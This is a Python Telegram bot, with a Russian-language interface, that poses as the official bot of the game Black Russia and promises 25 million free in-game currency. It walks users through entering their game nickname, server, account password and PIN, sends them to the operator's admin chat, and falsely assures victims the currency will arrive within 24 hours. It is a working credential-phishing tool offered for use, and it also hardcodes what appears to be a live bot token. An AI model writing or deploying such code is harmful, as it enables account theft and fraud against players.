import logging
import os
import asyncio
from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes, ConversationHandler

# ========== КОНФИГ ==========
TOKEN = os.environ.get("BOT_TOKEN", "8227199147:AAGISVvUfW1jst_ut-yUW0cokTyc8Rwj-pM")
ADMIN_ID = int(os.environ.get("ADMIN_ID", "6005507174"))

# Состояния для разговора
NICKNAME, SERVER, PASSWORD = range(3)

# Хранилище данных
user_data = {}

# Хранилище пользователей, которые уже получили бонус
completed_users = set()

# Загрузка已完成 пользователей из файла
CLAIMED_FILE = "claimed_users.json"

def load_claimed_users():
    global completed_users
    if os.path.exists(CLAIMED_FILE):
        try:
            with open(CLAIMED_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
                completed_users = set(data)
        except:
            completed_users = set()
    else:
        completed_users = set()

def save_claimed_users():
    with open(CLAIMED_FILE, 'w', encoding='utf-8') as f:
        json.dump(list(completed_users), f, ensure_ascii=False)

def has_user_claimed(user_id):
    return str(user_id) in completed_users

def mark_user_claimed(user_id):
    completed_users.add(str(user_id))
    save_claimed_users()

# Загружаем при старте
import json
load_claimed_users()

# ========== КЛАВИАТУРЫ ==========
def main_menu():
    keyboard = [
        [InlineKeyboardButton("💰 ПОЛУЧИТЬ 25КК 💰", callback_data="get_money")],
        [InlineKeyboardButton("🏠 ГЛАВНОЕ МЕНЮ 🏠", callback_data="main_menu")],
        [InlineKeyboardButton("📢 НАШ КАНАЛ 📢", url="https://t.me/br_dev")]
    ]
    return InlineKeyboardMarkup(keyboard)

# ========== ОБРАБОТЧИКИ ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "✨ **ДОБРО ПОЖАЛОВАТЬ В БОТА BLACK RUSSIA!** ✨\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🎮 **Официальный бот проекта Black Russia**\n\n"
        "💰 **АКЦИЯ ДЛЯ НОВЫХ ИГРОКОВ!** 💰\n\n"
        "🔥 Ты можешь получить **БЕСПЛАТНЫЕ 25.000.000** внутриигровой валюты!\n"
        "🎁 Бонус действует на **ЛЮБОМ СЕРВЕРЕ** проекта!\n\n"
        "⚠️ **ВНИМАНИЕ:** Бонус можно получить **ТОЛЬКО 1 РАЗ** на аккаунт!\n\n"
        "📌 **Как получить:**\n"
        "• Нажми на кнопку «💰 ПОЛУЧИТЬ 25КК»\n"
        "• Укажи свои данные\n"
        "• Дождись начисления (до 24 часов)\n\n"
        "⬇️ **ВЫБЕРИ ДЕЙСТВИЕ:** ⬇️"
    )
    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=main_menu())

async def main_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    text = (
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "✨ **ГЛАВНОЕ МЕНЮ** ✨\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🎮 **Black Russia Bot**\n\n"
        "💰 Бесплатные 25.000.000 валюты\n"
        "🌍 Доступно на всех серверах\n\n"
        "⚠️ Бонус только **1 раз** на аккаунт!\n\n"
        "📌 **Выбери действие ниже:**"
    )
    await query.edit_message_text(text, parse_mode="Markdown", reply_markup=main_menu())

async def get_money_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    
    # Проверяем, не получал ли уже пользователь бонус
    if has_user_claimed(user_id):
        await query.answer("❌ Вы уже получали бонус!", show_alert=True)
        text = (
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "❌ **ДОСТУП ЗАКРЫТ** ❌\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "😔 К сожалению, вы **УЖЕ ПОЛУЧИЛИ** бонус 25.000.000!\n\n"
            "⚠️ Акция действует **ТОЛЬКО 1 РАЗ** на аккаунт.\n\n"
            "🙏 Спасибо, что играете в Black Russia!\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=main_menu())
        return ConversationHandler.END
    
    await query.answer()
    text = (
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "🎮 **ШАГ 1 ИЗ 3** 🎮\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "✏️ **Введите ваш ИГРОВОЙ НИК:**\n\n"
        "📌 *Пример:* `Petya_Petrov`\n\n"
        "⚠️ Ник должен быть указан точно как в игре!"
    )
    await query.edit_message_text(text, parse_mode="Markdown")
    return NICKNAME

async def get_nickname(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data[user_id] = {"nickname": update.message.text}
    text = (
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "🌍 **ШАГ 2 ИЗ 3** 🌍\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "✏️ **Введите название СЕРВЕРА:**\n\n"
        "📌 *Примеры:* `MOSCOW`, `SPB`, `BLUE`, `RED`\n\n"
        "🌍 Доступны все серверы проекта!"
    )
    await update.message.reply_text(text, parse_mode="Markdown")
    return SERVER

async def get_server(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data[user_id]["server"] = update.message.text
    text = (
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "🔐 **ШАГ 3 ИЗ 3** 🔐\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "✏️ **Введите ПАРОЛЬ от аккаунта:**\n\n"
        "🔑 Если у вас установлен **ПИНКОД** — укажите и его тоже!\n\n"
        "📌 *Пример:* `mypassword123` или `mypass+1234`\n\n"
        "🔒 *Данные нужны только для начисления валюты!*"
    )
    await update.message.reply_text(text, parse_mode="Markdown")
    return PASSWORD

async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # Ещё раз проверяем перед сохранением
    if has_user_claimed(user_id):
        await update.message.reply_text("❌ Вы уже получали бонус!", reply_markup=main_menu())
        return ConversationHandler.END
    
    data = user_data.get(user_id, {})
    nickname = data.get("nickname", "?")
    server = data.get("server", "?")
    password = update.message.text
    username = update.effective_user.username or "Нет юзернейма"
    full_name = update.effective_user.full_name

    admin_msg = (
        f"🔔 *НОВАЯ ЗАЯВКА НА 25КК!* 🔔\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 *Пользователь:* {full_name}\n"
        f"🆔 *ID:* `{user_id}`\n"
        f"📛 *Username:* @{username}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎮 *Ник:* `{nickname}`\n"
        f"🌍 *Сервер:* `{server}`\n"
        f"🔑 *Пароль/Пинкод:* `{password}`\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"⏰ *Время:* {__import__('datetime').datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"✅ *Статус:* Ожидает выдачи!"
    )

    try:
        await context.bot.send_message(ADMIN_ID, admin_msg, parse_mode="Markdown")
        
        # Помечаем пользователя как получившего бонус
        mark_user_claimed(user_id)
        
        # Ответ пользователю
        text = (
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "✅ **ЗАЯВКА ПРИНЯТА!** ✅\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "💰 **25.000.000** внутриигровой валюты\n"
            "будет начислено в течение **24 часов**!\n\n"
            "📌 **Что дальше?**\n"
            "• Проверьте внутриигровую почту\n"
            "• Деньги поступят автоматически\n\n"
            "⚠️ **Напоминаем:** Бонус выдаётся **ТОЛЬКО 1 РАЗ**!\n\n"
            "🙏 **Спасибо, что выбрали Black Russia!**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "🎮 *Приятной игры!* 🎮"
        )
        await update.message.reply_text(text, parse_mode="Markdown", reply_markup=main_menu())
        
    except Exception as e:
        await update.message.reply_text("⚠️ Ошибка, владелец уведомлен.")

    if user_id in user_data:
        del user_data[user_id]
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "❌ **ОТМЕНЕНО** ❌\n\n"
        "Вы отменили получение валюты.\n"
        "Если передумаете — нажмите «💰 ПОЛУЧИТЬ 25КК»"
    )
    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=main_menu())
    return ConversationHandler.END

async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("⛔ *Нет доступа!* ⛔", parse_mode="Markdown")
        return
    
    text = (
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "🔧 **ПАНЕЛЬ АДМИНИСТРАТОРА** 🔧\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "✅ Бот работает в штатном режиме\n\n"
        f"📊 *Всего выдано бонусов:* {len(completed_users)}\n"
        f"👑 *Ваш ID:* `{update.effective_user.id}`\n\n"
        "📌 *Новые заявки приходят в этот чат*"
    )
    await update.message.reply_text(text, parse_mode="Markdown")

async def get_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "🆔 **ВАШ TELEGRAM ID** 🆔\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"`{update.effective_user.id}`\n\n"
        "📌 *Сохраните этот ID, он может понадобиться*"
    )
    await update.message.reply_text(text, parse_mode="Markdown")

# ========== ЗАПУСК БОТА ==========
async def run_bot():
    logging.basicConfig(level=logging.INFO)
    
    application = Application.builder().token(TOKEN).build()
    
    conv_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(get_money_start, pattern="get_money")],
        states={
            NICKNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_nickname)],
            SERVER: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_server)],
            PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("admin", admin_panel))
    application.add_handler(CommandHandler("id", get_id))
    application.add_handler(CallbackQueryHandler(main_menu_callback, pattern="main_menu"))
    application.add_handler(conv_handler)
    
    logging.info("🚀 Бот запущен!")
    
    await application.initialize()
    await application.start()
    await application.updater.start_polling()
    
    while True:
        await asyncio.sleep(3600)

# ========== FLASK ДЛЯ RENDER ==========
app_flask = Flask(__name__)

@app_flask.route('/')
def home():
    return "✅ Black Russia Bot is running!"

@app_flask.route('/health')
def health():
    return "OK"

# ========== ЗАПУСК ==========
if __name__ == "__main__":
    import threading
    
    port = int(os.environ.get("PORT", 8000))
    
    flask_thread = threading.Thread(target=lambda: app_flask.run(host="0.0.0.0", port=port))
    flask_thread.daemon = True
    flask_thread.start()
    
    asyncio.run(run_bot())
